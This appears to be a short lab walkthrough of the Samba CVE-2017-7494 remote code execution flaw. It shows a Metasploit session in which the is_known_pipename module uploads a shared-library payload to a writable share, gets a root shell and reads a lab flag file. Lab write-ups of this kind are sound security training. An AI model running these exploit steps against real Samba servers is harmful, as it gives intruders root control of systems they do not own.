#+title: Samba 3.5.0 - 4.6.4 Remote Code Execution (CVE-2017-7494)
#+author: gabriel

* intro
Samba is an open-source network file system protocol that provides services such as file and printer sharing.

This laboratory contains the CVE-2017-7494 vulnerability found in Samba versions since 3.5.0 and before 4.6.4, 4.5.10, and 4.4.14. This vulnerability allows attackers to perform remote code execution attacks, enabling the execution of arbitrary commands on the server and potentially taking control of the system.

* exploit
#+begin_src sh
msf exploit(linux/samba/is_known_pipename) > run
[*] 172.20.2.122:445 - Using location \\172.20.2.122\myshare\ for the path
[*] 172.20.2.122:445 - Retrieving the remote path of the share 'myshare'
[*] 172.20.2.122:445 - Share 'myshare' has server-side path '/home/share
[*] 172.20.2.122:445 - Uploaded payload to \\172.20.2.122\myshare\minYePdh.so
[*] 172.20.2.122:445 - Loading the payload from server-side path /home/share/minYePd
h.so using \\PIPE\/home/share/minYePdh.so...
[-] 172.20.2.122:445 -   >> Failed to load STATUS_OBJECT_NAME_NOT_FOUND
[*] 172.20.2.122:445 - Loading the payload from server-side path /home/share/minYePd
h.so using /home/share/minYePdh.so...
[+] 172.20.2.122:445 - Probe response indicates the interactive payload was loaded..
.
[*] Found shell.
[*] Command shell session 2 opened (10.8.58.60:36367 -> 172.20.2.122:445) at 2025-10
-06 21:56:39 -0300

ls

/bin/bash
clear
TERM environment variable not set.
whoami
root
cat /secret.txt
AvadaKedavra
#+end_src
